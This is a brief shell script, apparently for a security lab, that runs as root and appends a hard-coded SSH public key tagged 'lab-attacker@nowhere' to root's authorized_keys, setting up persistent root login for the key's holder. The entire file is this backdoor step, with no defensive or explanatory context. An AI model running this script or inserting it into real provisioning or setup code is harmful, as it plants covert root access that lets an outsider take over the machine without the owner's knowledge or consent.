#!/bin/sh
# Adds an SSH key to root's authorized_keys.
# Runs as root inside a lab machine.
set -eu
install -d -m 700 /root/.ssh
echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIEEHeD7aE8BzppJ7cPpeQnB7ZqgTT21bHJP6e40Gsq0 lab-attacker@nowhere' >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
